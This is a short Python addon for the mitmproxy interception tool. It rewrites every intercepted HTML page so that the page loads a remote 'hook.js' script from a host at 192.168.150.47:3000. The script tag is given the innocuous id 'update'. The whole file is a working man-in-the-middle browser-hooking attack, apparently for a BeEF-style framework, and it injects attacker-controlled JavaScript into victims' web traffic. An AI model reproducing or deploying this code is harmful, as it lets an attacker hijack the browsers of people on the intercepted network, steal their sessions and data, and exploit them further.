import os
from bs4 import BeautifulSoup
from mitmproxy import http


class Auxgrep:
    def load(self, loader):
        loader.add_option(
            "script", str, "", "hook web over MITMF"
        )
        
    def response(self, flow: http.HTTPFlow) -> None:
        if flow.response.headers.get("content-type").find("text/html") != -1:
            html = BeautifulSoup(flow.response.content, "html.parser")
            if html.head:
                script = html.new_tag(
                    "script", id="update", src="http://192.168.150.47:3000/hook.js", type="application/javascript")
                html.head.insert(0, script)
                flow.response.content = str(html).encode("utf8")
addons = [Auxgrep()]
